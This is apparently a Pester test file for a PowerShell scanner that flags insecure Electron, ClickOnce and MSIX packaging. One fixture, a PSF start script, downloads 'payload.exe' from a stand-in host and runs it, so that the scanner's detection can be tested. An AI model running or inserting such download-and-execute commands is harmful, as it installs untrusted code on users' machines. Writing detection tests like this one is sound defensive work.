Import-Module "$PSScriptRoot\..\TCPK.psd1" -Force -ErrorAction Stop

Describe 'WDAC bypass check (electron.wdac-bypass)' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'wdac-electron'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        New-Item (Join-Path $tmp 'resources') -ItemType Directory -Force | Out-Null
        New-Item (Join-Path $tmp 'resources\app') -ItemType Directory -Force | Out-Null
        # create marker files so isElectron triggers
        [IO.File]::WriteAllText((Join-Path $tmp 'electron.exe'), 'stub')
        [IO.File]::WriteAllText((Join-Path $tmp 'resources\app\main.js'), 'console.log("hello")')
    }
    It 'detects Electron marker and reaches WDAC check without error' {
        # smoke test: the cmdlet runs without throwing on a stub dir
        { Test-TcpkElectron -Path $tmp -ErrorAction Stop } | Should -Not -Throw
    }
}

Describe 'Squirrel updater detection (electron.squirrel-updater)' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'squirrel-app'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        # create Electron markers
        [IO.File]::WriteAllText((Join-Path $tmp 'electron.exe'), 'stub')
        New-Item (Join-Path $tmp 'resources') -ItemType Directory -Force | Out-Null
        # create Update.exe (Squirrel marker)
        [IO.File]::WriteAllText((Join-Path $tmp 'Update.exe'), 'stub-squirrel')
    }
    It 'emits electron.squirrel-updater finding' {
        $findings = @(Test-TcpkElectron -Path $tmp)
        $sq = $findings | Where-Object { $_.RuleId -eq 'electron.squirrel-updater' }
        $sq | Should -Not -BeNullOrEmpty
        $sq.Severity | Should -Be 'LOW'
        $sq.Confidence | Should -Be 'Confirmed'
    }
}

Describe 'electron-updater CVE-2024-39698 detection' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'eu-vuln'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        [IO.File]::WriteAllText((Join-Path $tmp 'electron.exe'), 'stub')
        New-Item (Join-Path $tmp 'resources') -ItemType Directory -Force | Out-Null
        $pkg = @{
            name = 'test-app'
            dependencies = @{ 'electron-updater' = '^5.3.0' }
        }
        [IO.File]::WriteAllText(
            (Join-Path $tmp 'package.json'),
            ($pkg | ConvertTo-Json -Depth 5),
            (New-Object Text.UTF8Encoding $false)
        )
    }
    It 'flags vulnerable electron-updater < 6.3.0' {
        $findings = @(Test-TcpkElectron -Path $tmp)
        $eu = $findings | Where-Object { $_.RuleId -eq 'electron.updater-sig-bypass' }
        $eu | Should -Not -BeNullOrEmpty
        $eu.Severity | Should -Be 'HIGH'
        $eu.Evidence | Should -BeLike '*electron-updater*'
    }
}

Describe 'electron-updater safe version' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'eu-safe'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        [IO.File]::WriteAllText((Join-Path $tmp 'electron.exe'), 'stub')
        New-Item (Join-Path $tmp 'resources') -ItemType Directory -Force | Out-Null
        $pkg = @{
            name = 'test-app'
            dependencies = @{ 'electron-updater' = '^6.3.1' }
        }
        [IO.File]::WriteAllText(
            (Join-Path $tmp 'package.json'),
            ($pkg | ConvertTo-Json -Depth 5),
            (New-Object Text.UTF8Encoding $false)
        )
    }
    It 'does NOT flag electron-updater >= 6.3.0' {
        $findings = @(Test-TcpkElectron -Path $tmp)
        $eu = $findings | Where-Object { $_.RuleId -eq 'electron.updater-sig-bypass' }
        $eu | Should -BeNullOrEmpty
    }
}

Describe 'Auto-updater HTTP feed URL detection' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'update-http'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        [IO.File]::WriteAllText((Join-Path $tmp 'electron.exe'), 'stub')
        New-Item (Join-Path $tmp 'resources') -ItemType Directory -Force | Out-Null
        $js = @'
const { autoUpdater } = require('electron-updater');
autoUpdater.setFeedURL({ url: 'http://updates.example.com/feed' });
autoUpdater.checkForUpdates();
'@
        [IO.File]::WriteAllText((Join-Path $tmp 'main.js'), $js)
    }
    It 'flags HTTP auto-updater feed URL' {
        $findings = @(Test-TcpkElectron -Path $tmp)
        $uf = $findings | Where-Object { $_.RuleId -eq 'electron.update-http' }
        $uf | Should -Not -BeNullOrEmpty
        $uf.Severity | Should -Be 'HIGH'
    }
}

Describe 'ClickOnce HTTP deployment detection' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'clickonce'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        $appref = 'http://insecure.example.com/app.application#SomeApp, Culture=neutral, PublicKeyToken=abc123'
        [IO.File]::WriteAllText((Join-Path $tmp 'MyApp.appref-ms'), $appref)
    }
    It 'flags .appref-ms with HTTP deployment URL' {
        $findings = @(Test-TcpkClickOnce -Path $tmp)
        $co = $findings | Where-Object { $_.RuleId -eq 'clickonce.http-deployment' }
        $co | Should -Not -BeNullOrEmpty
        $co.Severity | Should -Be 'HIGH'
        $co.Evidence | Should -BeLike '*http://*'
    }
}

Describe 'ClickOnce HTTPS deployment (info only)' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'clickonce-https'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        $appref = 'https://secure.example.com/app.application#SomeApp, Culture=neutral'
        [IO.File]::WriteAllText((Join-Path $tmp 'Safe.appref-ms'), $appref)
    }
    It 'emits INFO for HTTPS deployment' {
        $findings = @(Test-TcpkClickOnce -Path $tmp)
        $co = $findings | Where-Object { $_.RuleId -eq 'clickonce.deployment-present' }
        $co | Should -Not -BeNullOrEmpty
        $co.Severity | Should -Be 'INFO'
    }
}

Describe 'ClickOnce manifest HTTP codeBase' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'clickonce-manifest'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        $manifest = @'
<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2">
  <assemblyIdentity name="TestApp.application" version="1.0.0.0" />
  <deployment install="true">
    <subscription>
      <update>
        <expiration maximumAge="0" unit="days" />
      </update>
    </subscription>
    <deploymentProvider codebase="http://deploy.example.com/TestApp.application" />
  </deployment>
</asmv1:assembly>
'@
        [IO.File]::WriteAllText((Join-Path $tmp 'TestApp.application'), $manifest)
    }
    It 'flags HTTP codeBase in ClickOnce manifest' {
        $findings = @(Test-TcpkClickOnce -Path $tmp)
        $co = $findings | Where-Object { $_.RuleId -eq 'clickonce.manifest-http' }
        $co | Should -Not -BeNullOrEmpty
        $co.Severity | Should -Be 'HIGH'
    }
}

Describe 'ClickOnce FullTrust without signing' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'clickonce-ft'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        $manifest = @'
<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2">
  <assemblyIdentity name="TestApp.exe" version="1.0.0.0" />
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <applicationRequestMinimum>
        <PermissionSet Unrestricted="true" />
      </applicationRequestMinimum>
    </security>
  </trustInfo>
</asmv1:assembly>
'@
        [IO.File]::WriteAllText((Join-Path $tmp 'TestApp.exe.manifest'), $manifest)
    }
    It 'flags FullTrust without publisher identity as HIGH' {
        $findings = @(Test-TcpkClickOnce -Path $tmp)
        $ft = $findings | Where-Object { $_.RuleId -eq 'clickonce.full-trust' }
        $ft | Should -Not -BeNullOrEmpty
        $ft.Severity | Should -Be 'HIGH'
    }
}

Describe 'MSIX PSF script detection' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'msix-psf'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        $psfConfig = @{
            applications = @(
                @{
                    id = 'App'
                    executable = 'PsfLauncher64.exe'
                    startScript = @{
                        scriptPath = 'StartingScript.ps1'
                        runInVirtualEnvironment = $false
                        waitForScriptToFinish = $true
                    }
                }
            )
        }
        [IO.File]::WriteAllText(
            (Join-Path $tmp 'config.json'),
            ($psfConfig | ConvertTo-Json -Depth 5),
            (New-Object Text.UTF8Encoding $false)
        )
        $dangerScript = @'
Invoke-WebRequest -Uri "https://example.com/payload.exe" -OutFile "$env:TEMP\p.exe"
Start-Process "$env:TEMP\p.exe"
'@
        [IO.File]::WriteAllText((Join-Path $tmp 'StartingScript.ps1'), $dangerScript)
    }
    It 'detects PSF startScript' {
        $findings = @(Test-TcpkMsixPsf -Path $tmp)
        $ss = $findings | Where-Object { $_.RuleId -eq 'msix.psf-startScript' }
        $ss | Should -Not -BeNullOrEmpty
        $ss.Severity | Should -Be 'MEDIUM'
    }
    It 'flags dangerous operations in PSF script' {
        $findings = @(Test-TcpkMsixPsf -Path $tmp)
        $d = $findings | Where-Object { $_.RuleId -eq 'msix.psf-script-dangerous' }
        $d | Should -Not -BeNullOrEmpty
        $d.Severity | Should -Be 'HIGH'
        $d.Evidence | Should -BeLike '*network-download*'
        $d.Evidence | Should -BeLike '*process-spawn*'
    }
}

Describe 'MSIX PSF fixup DLLs' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'msix-fixups'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        $psfConfig = @{
            applications = @(
                @{
                    id = 'App'
                    executable = 'PsfLauncher64.exe'
                    fixups = @(
                        @{ dll = 'FileRedirectionFixup64.dll'; config = @{} }
                        @{ dll = 'RegLegacyFixups64.dll'; config = @{} }
                    )
                }
            )
        }
        [IO.File]::WriteAllText(
            (Join-Path $tmp 'config.json'),
            ($psfConfig | ConvertTo-Json -Depth 5),
            (New-Object Text.UTF8Encoding $false)
        )
    }
    It 'lists fixup DLLs' {
        $findings = @(Test-TcpkMsixPsf -Path $tmp)
        $fx = $findings | Where-Object { $_.RuleId -eq 'msix.psf-fixup-dlls' }
        $fx | Should -Not -BeNullOrEmpty
        $fx.Evidence | Should -BeLike '*FileRedirectionFixup*'
    }
}

Describe 'MSIX PSF runFullTrust + PSF combination' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'msix-fulltrust'
        New-Item $tmp -ItemType Directory -Force | Out-Null
        $psfConfig = @{
            applications = @(
                @{
                    id = 'App'
                    executable = 'PsfLauncher64.exe'
                    startScript = @{ scriptPath = 'Start.ps1' }
                }
            )
        }
        [IO.File]::WriteAllText(
            (Join-Path $tmp 'config.json'),
            ($psfConfig | ConvertTo-Json -Depth 5),
            (New-Object Text.UTF8Encoding $false)
        )
        [IO.File]::WriteAllText((Join-Path $tmp 'Start.ps1'), 'Write-Host "starting"')
        $manifest = @'
<?xml version="1.0" encoding="utf-8"?>
<Package xmlns="http://schemas.microsoft.com/appx/manifest/foundation/windows10" xmlns:rescap="http://schemas.microsoft.com/appx/manifest/foundation/windows10/restrictedcapabilities">
  <Identity Name="TestApp" Publisher="CN=Test" Version="1.0.0.0" />
  <Capabilities>
    <rescap:Capability Name="runFullTrust" />
  </Capabilities>
</Package>
'@
        [IO.File]::WriteAllText((Join-Path $tmp 'AppxManifest.xml'), $manifest)
    }
    It 'flags runFullTrust + PSF as HIGH' {
        $findings = @(Test-TcpkMsixPsf -Path $tmp)
        $ft = $findings | Where-Object { $_.RuleId -eq 'msix.psf-full-trust' }
        $ft | Should -Not -BeNullOrEmpty
        $ft.Severity | Should -Be 'HIGH'
    }
}

Describe 'ATT&CK and TASVS mappings for new RuleIds' {
    It 'maps appdomain.* to T1574.014' {
        $tech = & (Get-Module TCPK) { Get-TcpkAttackTechnique -RuleId 'appdomain.config-writable' }
        $tech | Should -Not -BeNullOrEmpty
        ($tech -join ' ') | Should -BeLike '*T1574*'
    }
    It 'maps electron.wdac-bypass to T1218' {
        $tech = & (Get-Module TCPK) { Get-TcpkAttackTechnique -RuleId 'electron.wdac-bypass' }
        $tech | Should -Not -BeNullOrEmpty
        ($tech -join ' ') | Should -BeLike '*T1218*'
    }
    It 'maps electron.updater-sig-bypass to T1195' {
        $tech = & (Get-Module TCPK) { Get-TcpkAttackTechnique -RuleId 'electron.updater-sig-bypass' }
        $tech | Should -Not -BeNullOrEmpty
        ($tech -join ' ') | Should -BeLike '*T1195*'
    }
    It 'maps clickonce.* to T1195' {
        $tech = & (Get-Module TCPK) { Get-TcpkAttackTechnique -RuleId 'clickonce.http-deployment' }
        $tech | Should -Not -BeNullOrEmpty
        ($tech -join ' ') | Should -BeLike '*T1195*'
    }
    It 'maps msix.psf* to T1059.001' {
        $tech = & (Get-Module TCPK) { Get-TcpkAttackTechnique -RuleId 'msix.psf-startScript' }
        $tech | Should -Not -BeNullOrEmpty
        ($tech -join ' ') | Should -BeLike '*T1059*'
    }
    It 'TASVS maps appdomain.* to TASVS-PLATFORM' {
        $ctrl = & (Get-Module TCPK) { Get-TcpkTasvsControl -RuleId 'appdomain.manager-configured' }
        $ctrl | Should -Not -BeNullOrEmpty
        ($ctrl -join ' ') | Should -BeLike '*TASVS-PLATFORM*'
    }
    It 'TASVS maps clickonce.* to TASVS-NETWORK' {
        $ctrl = & (Get-Module TCPK) { Get-TcpkTasvsControl -RuleId 'clickonce.manifest-http' }
        $ctrl | Should -Not -BeNullOrEmpty
        ($ctrl -join ' ') | Should -BeLike '*TASVS-NETWORK*'
    }
    It 'TASVS maps msix.psf* to TASVS-PLATFORM' {
        $ctrl = & (Get-Module TCPK) { Get-TcpkTasvsControl -RuleId 'msix.psf-full-trust' }
        $ctrl | Should -Not -BeNullOrEmpty
        ($ctrl -join ' ') | Should -BeLike '*TASVS-PLATFORM*'
    }
}

Describe 'No-op on empty directories' {
    BeforeAll {
        $tmp = Join-Path $TestDrive 'empty-dir'
        New-Item $tmp -ItemType Directory -Force | Out-Null
    }
    It 'Test-TcpkClickOnce returns nothing on empty dir' {
        $findings = @(Test-TcpkClickOnce -Path $tmp)
        $findings.Count | Should -Be 0
    }
    It 'Test-TcpkMsixPsf returns nothing on empty dir' {
        $findings = @(Test-TcpkMsixPsf -Path $tmp)
        $findings.Count | Should -Be 0
    }
}
